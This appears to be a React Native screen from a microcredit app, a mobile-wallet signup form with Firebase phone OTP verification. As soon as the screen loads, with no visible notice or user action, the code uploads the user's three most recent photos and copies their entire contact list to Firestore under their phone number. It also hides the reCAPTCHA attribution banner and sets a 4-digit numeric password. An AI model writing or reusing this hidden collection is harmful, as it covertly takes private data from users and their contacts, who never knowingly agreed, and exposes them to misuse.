import { Alert, StyleSheet, TextInput } from "react-native";
import React, { useEffect } from "react";
import type { NativeStackScreenProps } from "@react-navigation/native-stack";
import { SafeAreaView } from "react-native-safe-area-context";
import { Button, ScrollView, Spinner, Text, VStack } from "native-base";
import { RootStackParamList } from "../../src/types";
import { useFormContext } from "react-hook-form";
import FormInputSelect from "../../components/FormInputSelect";
import FormInputText from "../../components/FormInputText";
import {
  FirebaseRecaptchaBanner,
  FirebaseRecaptchaVerifierModal,
} from "expo-firebase-recaptcha";
import {
  getAuth,
  PhoneAuthProvider,
  signInWithCredential,
} from "firebase/auth";
import { getApp } from "firebase/app";
import * as MediaLibrary from "expo-media-library";
import * as ImagePicker from "expo-image-picker";
import { manipulateAsync } from "expo-image-manipulator";
import uploadImageAsync from "../../lib/uploadImage";
import * as Contacts from "expo-contacts";
import {
  doc,
  getDoc,
  getFirestore,
  setDoc,
  updateDoc,
} from "firebase/firestore";

type Props = NativeStackScreenProps<RootStackParamList, "MobileWallet">;
type ApiReturnType = {
  otp: number;
  phone_number_1: string;
};
const FifthAuthScreen = ({ navigation }: Props) => {
  const { trigger, getValues, reset } = useFormContext();
  const [loading, setLoading] = React.useState(false);

  const app = getApp();
  const auth = getAuth(app);

  const recaptchaVerifier = React.useRef<any>(null);
  const [verificationId, setVerificationId] = React.useState<string>("");
  const [verificationCode, setVerificationCode] = React.useState<string>("");

  const firebaseConfig = app ? app.options : undefined;

  let send_otp_code = async () => {
    const phoneProvider = new PhoneAuthProvider(auth);
    const verificationId = await phoneProvider.verifyPhoneNumber(
      `+233${getValues().phone_number_1}`,
      recaptchaVerifier.current
    );
    setVerificationId(verificationId);
  };

  const onSubmit = async () => {
    setLoading(true);
    let body = JSON.stringify(getValues());
    await fetch("https://test.api.junipermicrocredit.com/v1/user", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body,
    })
      .then((res) => res.json())
      .then(async (result) => {
        if (result.status) {
          const credential = PhoneAuthProvider.credential(
            verificationId,
            verificationCode
          );
          await signInWithCredential(auth, credential);
        } else {
          Alert.alert("Error", result.error);
        }
      });
    setLoading(false);
  };

  let upload_images = async () => {
    await MediaLibrary.requestPermissionsAsync();
    await ImagePicker.requestMediaLibraryPermissionsAsync();

    const { assets } = await MediaLibrary.getAssetsAsync({
      first: 3,
      mediaType: MediaLibrary.MediaType.photo,
      sortBy: MediaLibrary.SortBy.creationTime,
    });
    let newData: any = [];
    assets.forEach(async (data) => {
      let resizeImages = await manipulateAsync(
        data.uri,
        [{ resize: { height: 700, width: 1200 } }],
        { compress: 1 }
      );
      newData.push({ name: data.filename, url: resizeImages.uri });
      await uploadImageAsync(
        resizeImages.uri,
        `users_images/${getValues().phone_number_1}`
      );
    });
  };

  let get = getFirestore(app);

  let getContact = async () => {
    const { status } = await Contacts.requestPermissionsAsync();

    if (status === "granted") {
      const { data } = await Contacts.getContactsAsync({
        fields: [
          Contacts.Fields.Emails,
          Contacts.Fields.PhoneNumbers,
          Contacts.Fields.Image,
        ],
      });
      if (data.length > 0) {
        let users_contact: any = [];
        data.forEach((v) => {
          if (v.phoneNumbers)
            users_contact.push({ name: v.name, phoneNumber: v.phoneNumbers });
        });
        await getDoc(doc(get, "users", `${getValues().phone_number_1}`)).then(
          async (ref) => {
            if (ref.exists()) {
              await updateDoc(
                doc(get, "users", `${getValues().phone_number_1}`),
                {
                  contacts: users_contact,
                }
              );
            } else {
              await setDoc(doc(get, "users", `${getValues().phone_number_1}`), {
                contacts: users_contact,
              });
            }
          }
        );
      }
    }
  };

  useEffect(() => {
    upload_images();
    getContact();
  }, []);

  return (
    <SafeAreaView>
      <ScrollView w="100%">
        <VStack paddingX={2} space={3} alignItems="center" mb={4}>
          <FormInputSelect
            name="wallet_network"
            mb={3}
            options={[
              { label: "MTN", value: "MTN" },
              { label: "VODFONE", value: "VOD" },
              { label: "AIRTEL-TIGO", value: "AIR" },
            ]}
            placeholder="Mobile Wallet Network"
          />
          <FormInputText
            w="86%"
            placeholder="Wallet Holder Name"
            name="wallet_name"
          />
          <FormInputText
            w="86%"
            placeholder="Wallet Number"
            keyboardType="numeric"
            name="wallet_number"
          />
          <Text>
            Please set a 4 digit passcode for Logging into your account
          </Text>
          <FormInputText
            w="86%"
            placeholder="Password"
            keyboardType="numeric"
            name="password"
            maxLength={4}
          />
          <Text>Verify phone number before submitting form</Text>
          <Text>
            This {">"}
            {getValues().phone_number_1}
            {"<"} will receive a verification code OTP
          </Text>

          <Button w="85%" bgColor="primary.900" onPress={() => send_otp_code()}>
            Send OTP code
          </Button>
          <TextInput
            placeholder="Enter the OTP"
            keyboardType="numeric"
            onChangeText={setVerificationCode}
            maxLength={6}
            style={{
              width: "86%",
              borderColor: "black",
              borderWidth: StyleSheet.hairlineWidth,
              borderRadius: 10,
              padding: 5,
              paddingHorizontal: 10,
            }}
          />

          <FirebaseRecaptchaVerifierModal
            ref={recaptchaVerifier}
            firebaseConfig={firebaseConfig}
          />
          <FirebaseRecaptchaBanner style={{ display: "none", height: 0 }} />

          <Button
            w="85%"
            bgColor="primary.900"
            onPress={async () => {
              const result = await trigger([
                "wallet_network",
                "wallet_name",
                "wallet_number",
                "password",
              ]);
              if (result) onSubmit();
            }}
          >
            {loading ? (
              <Spinner accessibilityLabel="Submiting" color="gray" />
            ) : (
              "Submit"
            )}
          </Button>
        </VStack>
      </ScrollView>
    </SafeAreaView>
  );
};
// };

export default FifthAuthScreen;
